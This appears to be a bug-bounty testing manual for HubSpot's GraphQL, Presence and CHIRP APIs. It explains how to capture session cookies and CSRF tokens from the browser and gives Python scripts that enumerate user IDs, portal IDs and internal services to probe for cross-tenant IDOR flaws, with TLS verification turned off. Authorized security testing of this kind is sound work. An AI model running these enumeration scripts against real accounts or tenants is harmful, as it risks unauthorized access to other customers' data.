# HubSpot Security Testing - Instruction Manual

**Purpose:** Replicate Track A (GraphQL) and Track B (API Testing) with low-privileged user credentials

**Date:** 2025-10-17
**Status:** Ready for Testing

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Cookie & Header Capture](#cookie--header-capture)
3. [Track A: GraphQL Testing](#track-a-graphql-testing)
4. [Track B: API Testing (Presence, CHIRP)](#track-b-api-testing)
5. [Template Scripts](#template-scripts)
6. [Troubleshooting](#troubleshooting)

---

## Prerequisites

### Required Information

You need to extract the following from your low-privileged HubSpot account:

1. **Portal ID** - Your tenant/account ID
2. **User ID** - Your user ID within the portal
3. **Session Cookies** - Fresh authentication cookies
4. **CSRF Token** - Anti-CSRF token from cookies
5. **Hublet** - Which HubSpot cluster you're on (na1, na2, eu1, etc.)

### Tools Used

**Python Scripts:**
- Python 3.x (built-in libraries: `urllib`, `json`, `ssl`, `re`)
- No external dependencies required

**Browser:**
- Firefox/Chrome Developer Tools (Network tab)
- Cookie export extension (optional but helpful)

---

## Cookie & Header Capture

### Method 1: Browser DevTools (Recommended)

#### Step 1: Open Network Tab

1. Log into HubSpot with your **low-privileged account**
2. Press `F12` to open Developer Tools
3. Go to **Network** tab
4. Clear all requests (trash icon)

#### Step 2: Capture GraphQL Request (Track A)

1. Navigate to: `https://app-{hublet}.hubspot.com/contacts/{portalId}/objects/0-1/views/all/list`
   - Replace `{hublet}` with your cluster (check URL after login)
   - Replace `{portalId}` with your portal ID
2. In Network tab, filter for `graphql`
3. Look for POST request to `/api/graphql/crm`
4. Right-click the request → **Copy** → **Copy as cURL**

#### Step 3: Capture Presence API Request (Track B)

1. Stay on the same page or navigate to settings
2. In Network tab, filter for `presence`
3. Look for PUT request to `/api/presence/v1/presence/portal/...`
4. Right-click → **Copy** → **Copy as cURL**

#### Step 4: Extract Components from cURL

From the cURL command, extract:

**URL Components:**
```
POST https://app-na2.hubspot.com/api/graphql/crm?portalId=YOUR_PORTAL_ID&...
```
Extract:
- `Hublet`: na2 (from app-na2.hubspot.com)
- `Portal ID`: The number after portalId=
- `Endpoint`: /api/graphql/crm

**Headers:**
```bash
-H 'Cookie: FPID=...; hubspotapi=...; csrf.app=...'
-H 'X-HubSpot-CSRF-hubspotapi: AAccUf...'
```
Extract:
- Full Cookie header (everything after `Cookie: `)
- CSRF token (after `X-HubSpot-CSRF-hubspotapi: `)

**Body (for GraphQL):**
```json
{"query":"..."}
```

### Method 2: Manual Extraction

#### Get Portal ID

1. After login, check browser URL:
   ```
   https://app-na2.hubspot.com/contacts/242862774/...
                                           ^^^^^^^^^^^
                                           Portal ID
   ```

#### Get User ID

1. Open browser console (F12 → Console)
2. Type:
   ```javascript
   // Get user ID from window object
   window.hubspot?.bender?.currentUser?.user_id

   // OR check network requests for /user/{ID}
   ```

#### Get Hublet

From URL: `app-na2.hubspot.com` → Hublet is `na2`

Common hublets:
- `na1` - North America 1
- `na2` - North America 2
- `eu1` - Europe 1
- `ap1` - Asia Pacific 1

#### Get Cookies

**Option A: DevTools**
1. F12 → Application tab → Cookies → app-na2.hubspot.com
2. Copy all cookies in this format:
   ```
   name1=value1; name2=value2; name3=value3
   ```

**Option B: EditThisCookie Extension**
1. Install "EditThisCookie" browser extension
2. Click extension icon
3. Click "Export" → Copies all cookies
4. Format: You'll need to convert to header format

**Key Cookies to Include:**
- `hubspotapi` (main session)
- `hubspotapi-csrf` (CSRF token)
- `csrf.app` (CSRF token duplicate)
- `__cf_bm` (Cloudflare)
- `_cfuvid` (Cloudflare)

#### Get CSRF Token

CSRF token appears in two places:
1. Cookie: `csrf.app=AAccUft...`
2. Cookie: `hubspotapi-csrf=AAccUft...`

The value is the same. Extract it:
```
AAccUftW_vMiGJSMze2aLQQb-n6O-f7k_rR2-Uy1Kq3dnl9JfUQkyZs8RgJfvwL_j0TSpidF3ZZhy2URM0rGeqj6p0XmQEAkhw
```

---

## Track A: GraphQL Testing

### GraphQL Endpoint Configuration

**Full Endpoint:**
```
POST https://app-{HUBLET}.hubspot.com/api/graphql/crm
    ?portalId={PORTAL_ID}
    &clienttimeout=14000
    &hs_static_app=crm-index-ui
    &hs_static_app_version=2.49724
```

**Replace:**
- `{HUBLET}` → Your hublet (e.g., `na2`)
- `{PORTAL_ID}` → Your low-privileged portal ID

### Required Headers

```http
Cookie: [YOUR_FULL_COOKIE_HEADER]
Content-Type: application/json
X-HubSpot-CSRF-hubspotapi: [YOUR_CSRF_TOKEN]
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Origin: https://app-{HUBLET}.hubspot.com
Referer: https://app-{HUBLET}.hubspot.com/contacts/{PORTAL_ID}/objects/0-1/views/all/list
```

### Request Body Format

**Simple Query:**
```json
{
  "query": "{ __typename }"
}
```

**With Variables:**
```json
{
  "query": "query MyQuery($portalId: String!) { ... }",
  "variables": {
    "portalId": "YOUR_PORTAL_ID"
  },
  "operationName": "MyQuery"
}
```

**Important:** Body is a simple JSON object, NOT an array.

### Example GraphQL Queries

#### 1. Basic Schema Check
```json
{
  "query": "{ __typename }"
}
```

**Expected Response:**
```json
{
  "data": {
    "__typename": "Query"
  }
}
```

#### 2. Schema Introspection
```json
{
  "query": "{ __schema { queryType { name } mutationType { name } } }"
}
```

#### 3. Contact Search (IDOR Test)
```json
{
  "query": "query { crmObjectsSearch(type: \"0-1\", filterGroups: [], count: 10) { total results { id properties(names: [\"email\", \"firstname\", \"lastname\"]) { name value } } } }"
}
```

**IDOR Test:** Change `portalId` in URL to test cross-portal access

---

## Track B: API Testing

### Presence API Configuration

**Endpoint:**
```
PUT https://app-{HUBLET}.hubspot.com/api/presence/v1/presence/portal/{PORTAL_ID}/user/{USER_ID}
    ?hs_static_app=notifications
    &hs_static_app_version=1.11623
    &portalId={PORTAL_ID}
```

**Replace:**
- `{HUBLET}` → Your hublet
- `{PORTAL_ID}` → Your portal ID
- `{USER_ID}` → Your user ID

### Required Headers

```http
Cookie: [YOUR_FULL_COOKIE_HEADER]
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Origin: https://app-{HUBLET}.hubspot.com
Referer: https://app-{HUBLET}.hubspot.com/settings/{PORTAL_ID}/user-preferences/profile
```

### Request Body Format

```json
{
  "token": "H4VoM6+fU6KcYBV6hCHQlRgIIlWh7eXjj9GndVXYdonN0SOe1NsO/LUy6b4n6h1ZrUXrTrDo1IlsnLsln1zrkUUF+N9lG7dr5hjCKDaRKggR/xuHaz9ygQ=="
}
```

**Note:** Token value can be empty `{}` for testing, or extracted from actual request.

### CHIRP API Configuration

**Endpoint:**
```
POST https://app-{HUBLET}.hubspot.com/api/chirp-frontend-app/v1/gateway/{SERVICE}/{METHOD}
    ?hs_static_app=setup-guide-ui
    &hs_static_app_version=1.50381
    &portalId={PORTAL_ID}
    &clienttimeout=5000
```

**Known Service (from method_endpoints.md):**
```
SERVICE: com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService
METHOD: validatePortalForGrowthProPlusExposure
```

### Required Headers (CHIRP)

```http
Cookie: [YOUR_FULL_COOKIE_HEADER]
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Origin: https://app-{HUBLET}.hubspot.com
```

### Request Body Format (CHIRP)

```json
{}
```

**Note:** CHIRP accepts empty body for most methods.

---

## Template Scripts

### Template 1: GraphQL Testing

**File:** `/tmp/test_lowpriv_graphql.py`

```python
#!/usr/bin/env python3
import urllib.request
import ssl
import json

# ============================================================================
# CONFIGURATION - REPLACE WITH YOUR LOW-PRIVILEGED ACCOUNT VALUES
# ============================================================================

# Your configuration
HUBLET = "na2"  # Your hublet (na1, na2, eu1, etc.)
PORTAL_ID = "YOUR_PORTAL_ID_HERE"  # Your low-priv portal ID

# Your cookies (copy from browser DevTools)
COOKIE_HEADER = """
PASTE_YOUR_COOKIES_HERE
""".strip()

# Your CSRF token (from csrf.app or hubspotapi-csrf cookie)
CSRF_TOKEN = "YOUR_CSRF_TOKEN_HERE"

# ============================================================================
# DO NOT EDIT BELOW THIS LINE
# ============================================================================

# SSL context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Build endpoint
base_url = f"https://app-{HUBLET}.hubspot.com"
endpoint = "/api/graphql/crm"
params = f"?portalId={PORTAL_ID}&clienttimeout=14000&hs_static_app=crm-index-ui&hs_static_app_version=2.49724"
full_url = f"{base_url}{endpoint}{params}"

def test_graphql(query_name, query):
    """Test GraphQL query"""
    print(f"\n{'='*70}")
    print(f"TEST: {query_name}")
    print('='*70)

    req = urllib.request.Request(full_url, method='POST')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('Content-Type', 'application/json')
    req.add_header('X-HubSpot-CSRF-hubspotapi', CSRF_TOKEN)
    req.add_header('Accept', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0')
    req.add_header('Origin', base_url)

    body = {"query": query}
    data = json.dumps(body).encode('utf-8')

    try:
        response = urllib.request.urlopen(req, data=data, context=ctx, timeout=15)
        content = response.read().decode('utf-8')

        json_response = json.loads(content)

        if 'data' in json_response:
            print(f"✓ SUCCESS")
            print(json.dumps(json_response['data'], indent=2)[:500])
            return True, json_response['data']
        elif 'errors' in json_response:
            print(f"✗ GraphQL Errors:")
            print(json.dumps(json_response['errors'], indent=2))
            return False, json_response['errors']

    except urllib.error.HTTPError as e:
        print(f"✗ HTTP {e.code}: {e.reason}")
        try:
            error = e.read().decode('utf-8')
            print(f"  {error[:200]}")
        except:
            pass
        return False, None
    except Exception as e:
        print(f"✗ Error: {e}")
        return False, None

# Test 1: Basic query
print("="*70)
print("LOW-PRIVILEGED GRAPHQL TESTING")
print("="*70)
print(f"Portal ID: {PORTAL_ID}")
print(f"Hublet: {HUBLET}")

test_graphql("Basic Typename", "{ __typename }")

# Test 2: Schema check
test_graphql(
    "Schema Metadata",
    "{ __schema { queryType { name } mutationType { name } } }"
)

# Test 3: Contact search (your own data)
test_graphql(
    "Contact Search (Own Portal)",
    """
    query {
      crmObjectsSearch(type: "0-1", filterGroups: [], count: 5) {
        total
        results {
          id
          properties(names: ["email", "firstname"]) {
            name
            value
          }
        }
      }
    }
    """
)

print(f"\n{'='*70}")
print("TESTING COMPLETE")
print('='*70)
```

**Usage:**
```bash
# 1. Edit the CONFIGURATION section with your values
# 2. Run the script
python3 /tmp/test_lowpriv_graphql.py
```

---

### Template 2: Presence API IDOR Testing

**File:** `/tmp/test_lowpriv_presence.py`

```python
#!/usr/bin/env python3
import urllib.request
import ssl
import json

# ============================================================================
# CONFIGURATION - REPLACE WITH YOUR VALUES
# ============================================================================

HUBLET = "na2"
PORTAL_ID = "YOUR_PORTAL_ID_HERE"
USER_ID = "YOUR_USER_ID_HERE"

COOKIE_HEADER = """
PASTE_YOUR_COOKIES_HERE
""".strip()

# ============================================================================

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base_url = f"https://app-{HUBLET}.hubspot.com"

def test_presence(portal_id, user_id, test_name):
    """Test Presence API"""
    path = f"/api/presence/v1/presence/portal/{portal_id}/user/{user_id}"
    params = f"?hs_static_app=notifications&hs_static_app_version=1.11623&portalId={portal_id}"
    full_url = f"{base_url}{path}{params}"

    print(f"\n{'='*70}")
    print(f"TEST: {test_name}")
    print(f"Portal: {portal_id}, User: {user_id}")
    print('='*70)

    req = urllib.request.Request(full_url, method='PUT')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('Content-Type', 'application/json')
    req.add_header('Accept', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0')
    req.add_header('Origin', base_url)

    data = json.dumps({}).encode('utf-8')

    try:
        response = urllib.request.urlopen(req, data=data, context=ctx, timeout=10)
        content = response.read().decode('utf-8')
        print(f"✓ Status: {response.status}")

        try:
            json_resp = json.loads(content)
            print(f"✓ Response: {json.dumps(json_resp, indent=2)[:200]}")
        except:
            print(f"✓ Response: {content[:200]}")

        return True, response.status

    except urllib.error.HTTPError as e:
        print(f"✗ HTTP {e.code}: {e.reason}")

        try:
            error = json.loads(e.read().decode('utf-8'))
            print(f"  {json.dumps(error, indent=2)}")

            if e.code == 403:
                print(f"  → Resource exists but forbidden (good for enumeration)")
            elif e.code == 404:
                print(f"  → Resource doesn't exist")
            elif e.code == 488:
                print(f"  → Wrong hublet: {error.get('correctHublet')}")

        except:
            pass

        return False, e.code

    except Exception as e:
        print(f"✗ Error: {e}")
        return False, None

print("="*70)
print("PRESENCE API - IDOR TESTING")
print("="*70)

# Test 1: Your own user (baseline)
test_presence(PORTAL_ID, USER_ID, "Baseline (Own User)")

# Test 2: Different user IDs (IDOR test)
print(f"\n{'#'*70}")
print("# IDOR TEST: User Enumeration")
print(f"{'#'*70}")

for offset in [+1, +2, +10, +100, -1]:
    test_user = str(int(USER_ID) + offset)
    test_presence(PORTAL_ID, test_user, f"User ID {offset:+d}")

# Test 3: Different portal IDs (IDOR test)
print(f"\n{'#'*70}")
print("# IDOR TEST: Portal Enumeration")
print(f"{'#'*70}")

for offset in [+1, +2, +10, -1]:
    test_portal = str(int(PORTAL_ID) + offset)
    test_presence(test_portal, USER_ID, f"Portal ID {offset:+d}")

print(f"\n{'='*70}")
print("TESTING COMPLETE")
print('='*70)
```

---

### Template 3: CHIRP Endpoint Testing

**File:** `/tmp/test_lowpriv_chirp.py`

```python
#!/usr/bin/env python3
import urllib.request
import ssl
import json

# ============================================================================
# CONFIGURATION
# ============================================================================

HUBLET = "na2"
PORTAL_ID = "YOUR_PORTAL_ID_HERE"

COOKIE_HEADER = """
PASTE_YOUR_COOKIES_HERE
""".strip()

# ============================================================================

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base_url = f"https://app-{HUBLET}.hubspot.com"
chirp_base = "/api/chirp-frontend-app/v1/gateway"

def test_chirp(service, method, test_name):
    """Test CHIRP endpoint"""
    path = f"{chirp_base}/{service}/{method}"
    params = f"?hs_static_app=setup-guide-ui&hs_static_app_version=1.50381&portalId={PORTAL_ID}&clienttimeout=5000"
    full_url = f"{base_url}{path}{params}"

    print(f"\n{'='*70}")
    print(f"TEST: {test_name}")
    print(f"Service: {service.split('.')[-1]}")
    print(f"Method: {method}")
    print('='*70)

    req = urllib.request.Request(full_url, method='POST')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('Content-Type', 'application/json')
    req.add_header('Accept', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0')
    req.add_header('Origin', base_url)

    data = json.dumps({}).encode('utf-8')

    try:
        response = urllib.request.urlopen(req, data=data, context=ctx, timeout=10)
        content = response.read().decode('utf-8')

        print(f"✓ Status: {response.status}")
        print(f"✓ Response: {content[:200]}")
        return True

    except urllib.error.HTTPError as e:
        print(f"✗ HTTP {e.code}: {e.reason}")

        try:
            error = e.read().decode('utf-8')
            error_json = json.loads(error)
            print(f"  {json.dumps(error_json, indent=2)}")

            # Check for CHIRP-specific errors
            if 'serviceName' in error or 'methodName' in error:
                print(f"  ✓ CHIRP framework confirmed in error")

        except:
            print(f"  {error[:200] if 'error' in locals() else 'No error content'}")

        return False

    except Exception as e:
        print(f"✗ Error: {e}")
        return False

print("="*70)
print("CHIRP RPC TESTING")
print("="*70)

# Test known CHIRP service from method_endpoints.md
test_chirp(
    "com.hubspot.growth.post.purchases.rpc.server.GrowthPostPurchasesChirpService",
    "validatePortalForGrowthProPlusExposure",
    "Known CHIRP Service"
)

# Test other potential services
print(f"\n{'#'*70}")
print("# Service Enumeration")
print(f"{'#'*70}")

services = [
    ("com.hubspot.contacts.rpc.server.ContactsChirpService", "get"),
    ("com.hubspot.users.rpc.server.UsersChirpService", "getCurrentUser"),
    ("com.hubspot.auth.rpc.server.AuthChirpService", "validate"),
]

for service, method in services:
    test_chirp(service, method, f"Test: {service.split('.')[-1]}")

print(f"\n{'='*70}")
print("TESTING COMPLETE")
print('='*70)
```

---

## Capture Instructions Summary

### Quick Capture Checklist

**For Track A (GraphQL):**
1. ✅ Navigate to Contacts page
2. ✅ Open DevTools Network tab
3. ✅ Filter for "graphql"
4. ✅ Find POST to `/api/graphql/crm`
5. ✅ Right-click → Copy → Copy as cURL
6. ✅ Extract: URL, cookies, CSRF token, hublet

**For Track B (Presence API):**
1. ✅ Navigate to Settings/Notifications page
2. ✅ Filter Network for "presence"
3. ✅ Find PUT to `/api/presence/v1/presence/portal/...`
4. ✅ Extract: portal ID, user ID, cookies, hublet

**For Track B (CHIRP):**
1. ✅ Navigate to any CRM page
2. ✅ Filter Network for "chirp"
3. ✅ Find POST to `/api/chirp-frontend-app/v1/gateway/...`
4. ✅ Extract: service name, method name, cookies

---

## Troubleshooting

### Common Issues

#### Issue 1: HTTP 401 Unauthorized

**Cause:** Cookies expired or invalid

**Solution:**
1. Re-capture cookies from fresh browser session
2. Make sure you're logged into the low-privileged account
3. Cookies are valid for ~1 hour typically
4. Don't copy cookies from different hublet domains

#### Issue 2: HTTP 403 Forbidden

**Cause:** CSRF token missing or expired

**Solution:**
1. Extract fresh CSRF token from `csrf.app` cookie
2. Add header: `X-HubSpot-CSRF-hubspotapi: [TOKEN]`
3. CSRF token must match cookie value exactly

#### Issue 3: HTTP 404 Not Found

**Cause:** Wrong endpoint path or hublet

**Solution:**
1. Check you're using correct hublet (na1, na2, etc.)
2. Verify endpoint path:
   - GraphQL: `/api/graphql/crm` (NOT `/graphql`)
   - Presence: `/api/presence/v1/presence/portal/...`
   - CHIRP: `/api/chirp-frontend-app/v1/gateway/...`

#### Issue 4: HTTP 488 Wrong Hublet

**Cause:** Portal exists on different hublet

**Solution:**
1. Check error message for `correctHublet` field
2. Update `HUBLET` variable to correct value
3. Example: If error says "na2", use `app-na2.hubspot.com`

#### Issue 5: HTTP 500 Internal Server Error

**Cause:** Malformed request body or query

**Solution:**
1. Check JSON syntax in request body
2. For GraphQL: Use simple query first (`{ __typename }`)
3. For CHIRP: Use empty body `{}`
4. Validate query structure

### Cookie Validation Test

Before running full tests, validate your cookies:

```python
import urllib.request, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Test URL (replace values)
test_url = "https://app-na2.hubspot.com/contacts/YOUR_PORTAL_ID/objects/0-1/views/all/list"
cookies = "YOUR_COOKIES_HERE"

req = urllib.request.Request(test_url)
req.add_header('Cookie', cookies)

try:
    response = urllib.request.urlopen(req, context=ctx)
    if 'login' not in response.url:
        print("✓ Cookies valid!")
    else:
        print("✗ Redirected to login - cookies expired")
except Exception as e:
    print(f"✗ Error: {e}")
```

### Debugging Tips

1. **Print Full Request:**
   ```python
   print(f"URL: {full_url}")
   print(f"Cookie length: {len(cookie_header)}")
   print(f"CSRF: {csrf_token[:20]}...")
   print(f"Body: {json.dumps(body)}")
   ```

2. **Check Response Headers:**
   ```python
   print(f"Response headers: {response.headers}")
   ```

3. **Save Raw Response:**
   ```python
   with open('/tmp/response.json', 'w') as f:
       f.write(content)
   ```

---

## Testing Workflow

### Phase 1: Baseline Testing (Verify Setup)

**Objective:** Confirm cookies and configuration work

1. Run GraphQL basic query test
2. Run Presence API baseline test
3. Verify all return 200 OK

**Expected Results:**
- GraphQL: `{"__typename": "Query"}`
- Presence: 200 OK or valid response

### Phase 2: Horizontal Privilege Escalation (Low-Priv Focus)

**Objective:** Test what low-privileged user can access

**Track A Tests:**
1. Query contacts in own portal (should work)
2. Query users in own portal (check permissions)
3. Query companies in own portal
4. Attempt mutations (check if allowed)

**Track B Tests:**
1. Access own user presence (baseline)
2. Try accessing other user IDs in same portal
3. Try accessing presence in other portals

### Phase 3: IDOR Testing

**Objective:** Test cross-tenant/cross-user access

**User IDOR:**
```python
# Test sequential user IDs
for i in range(10):
    test_user_id = str(int(YOUR_USER_ID) + i)
    # Test presence API or GraphQL user queries
```

**Portal IDOR:**
```python
# Test portal ID enumeration
for i in range(10):
    test_portal_id = str(int(YOUR_PORTAL_ID) + i)
    # Test with different portal IDs in URL
```

### Phase 4: Enumeration

**Objective:** Map valid resources via error codes

**Error Code Mapping:**
- `200 OK` → Resource accessible
- `403 Forbidden` → Resource exists but unauthorized
- `404 Not Found` → Resource doesn't exist
- `488 Custom` → Wrong hublet (resource exists elsewhere)

**Use Cases:**
- Valid user enumeration (403 vs 404)
- Valid portal enumeration (488 response)
- Service method enumeration (CHIRP errors)

---

## Expected Results by Privilege Level

### Low-Privileged User (Expected Behavior)

**Should Be Able To:**
- ✅ Query own contact data
- ✅ View contacts they have permission to see
- ✅ Access own user presence
- ✅ View limited company data

**Should NOT Be Able To:**
- ❌ Access other portals' data
- ❌ Access other users' data (horizontal escalation)
- ❌ Run admin mutations (create/delete users)
- ❌ View restricted fields

### Vulnerability Indicators

**IDOR Vulnerability Present:**
- ✅ 200 OK when accessing other user IDs
- ✅ Data returned for other portal IDs
- ✅ Can modify other users' resources

**Multi-Tenant Isolation Broken:**
- ✅ Portal ID in URL can be changed to access other tenants
- ✅ Query parameters override path parameters
- ✅ Error messages differ between valid/invalid resources

---

## File Naming Convention

Save your test results with clear naming:

```
Low-Priv-Track-A-GraphQL-Results.md
Low-Priv-Track-B-Presence-IDOR-Results.md
Low-Priv-Track-B-CHIRP-Results.md
Low-Priv-Portal-{PORTAL_ID}-Summary.md
```

Include in each report:
- Portal ID tested
- User ID tested
- Hublet
- Date/time of test
- Cookie age (how fresh)
- Results for each test case

---

## Security & Privacy Notes

**Cookie Security:**
- ⚠️ Cookies contain session tokens - keep secure
- ⚠️ Don't commit cookies to git
- ⚠️ Don't share cookies in public reports
- ⚠️ Cookies expire quickly (typically 1-2 hours)

**Ethical Testing:**
- ✅ Only test accounts you own or have permission to test
- ✅ Use low-privileged test accounts, not production admin accounts
- ✅ Don't attempt to access real customer data
- ✅ Report findings responsibly via HubSpot's bug bounty program

**Data Handling:**
- ✅ Don't save PII from responses
- ✅ Redact sensitive data in reports
- ✅ Use placeholder values in examples

---

## Next Steps After Testing

1. **Document Results:**
   - Screenshot successful tests
   - Save response JSON (redacted)
   - Note error codes and patterns

2. **Analyze Findings:**
   - Compare low-priv results to expected behavior
   - Identify privilege escalation opportunities
   - Map accessible vs. restricted resources

3. **Prepare Bug Bounty Report:**
   - Severity assessment
   - Step-by-step reproduction
   - Impact analysis
   - Suggested remediation

---

## Quick Reference

### Track A (GraphQL)

```
Endpoint: POST https://app-{HUBLET}.hubspot.com/api/graphql/crm?portalId={PORTAL_ID}&...
Headers: Cookie, X-HubSpot-CSRF-hubspotapi, Content-Type: application/json
Body: {"query": "{ __typename }"}
```

### Track B (Presence)

```
Endpoint: PUT https://app-{HUBLET}.hubspot.com/api/presence/v1/presence/portal/{PORTAL_ID}/user/{USER_ID}?...
Headers: Cookie, Content-Type: application/json
Body: {}
```

### Track B (CHIRP)

```
Endpoint: POST https://app-{HUBLET}.hubspot.com/api/chirp-frontend-app/v1/gateway/{SERVICE}/{METHOD}?portalId={PORTAL_ID}&...
Headers: Cookie, Content-Type: application/json
Body: {}
```

---

**Manual Version:** 1.0
**Last Updated:** 2025-10-17
**Status:** Ready for Low-Privileged Testing ✅
